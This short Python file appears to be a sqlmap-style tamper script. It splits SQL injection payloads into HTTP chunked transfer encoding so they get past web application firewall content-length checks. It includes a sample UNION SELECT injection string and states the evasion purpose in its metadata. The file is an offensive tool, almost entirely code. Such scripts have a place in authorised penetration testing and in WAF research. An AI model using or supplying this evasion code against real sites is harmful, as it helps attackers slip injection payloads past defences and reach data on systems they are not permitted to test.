import random
import string

__example_payload__ = "' AND 1=1 UNION SELECT NULL,NULL--"
__type__ = "chunked transfer encoding to bypass WAF content-length checks"


def tamper(payload, chunk_size=4, **kwargs):
    if payload:
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        retval = ""
        for chunk in chunks:
            chunk_len = format(len(chunk), 'x')
            retval += "{}\r\n{}\r\n".format(chunk_len, chunk)
        retval += "0\r\n\r\n"
        return retval
    return payload
